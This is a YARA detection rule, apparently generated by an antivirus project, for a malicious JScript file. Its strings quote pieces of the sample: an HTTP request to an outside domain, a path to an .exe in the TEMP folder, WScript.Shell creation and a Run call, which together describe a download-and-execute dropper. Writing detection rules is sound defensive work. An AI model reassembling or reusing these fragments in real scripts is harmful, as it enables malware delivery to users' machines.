rule sig_20160329_50e1db494617942e9a81537ce41ba74b {
  meta:
    description = "datamaliciousorder - file 20160329_50e1db494617942e9a81537ce41ba74b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "74e198350b0e65f4fb20dbd1c341565a2d855f251a40d8b39fddac6af6df47df"

  strings:
    $s1  = "Yy[eI](\"GET\", \"http://pasticceriabonci.com/n4usj\", false);" fullword ascii
    $s2  = "function A() {return A0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IuxJ27YFJj0etLc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[n](er() * 11); if (Yy[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function X(kj, hM){r = r * 1; return kj - hM;};" fullword ascii
    $s5  = "var A0 = function w() {return WScript[o](\"WScript.Shell\");}(), qP = 11;" fullword ascii
    $s6  = "function ix(){return \"\" + s;};" fullword ascii
    $s7  = "function bg() {return ((X0 == true) && (X0 == wx)) ? 1 : r;};" fullword ascii
    $s8  = "function VS(aS){A0[\"Run\"](aS, r, r);};" fullword ascii
    $s9  = " while (l){" fullword ascii
    $s10 = "function sH()" fullword ascii
    $s11 = "var iy = new this[\"Date\"]();" fullword ascii
    $s12 = "function er(){return 22;};" fullword ascii
    $s13 = "return X(xX, Lv);" fullword ascii
    $s14 = "function G(z) {var L = (1, 2, 3, 4, 5, z); return L;};" fullword ascii
    $s15 = "function U(){return o;};" fullword ascii
    $s16 = "var wx = false;" fullword ascii
    $s17 = "wx = true; " fullword ascii
    $s18 = "var X0 = false;" fullword ascii
    $s19 = "X0 = true; " fullword ascii
    $s20 = "var l0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}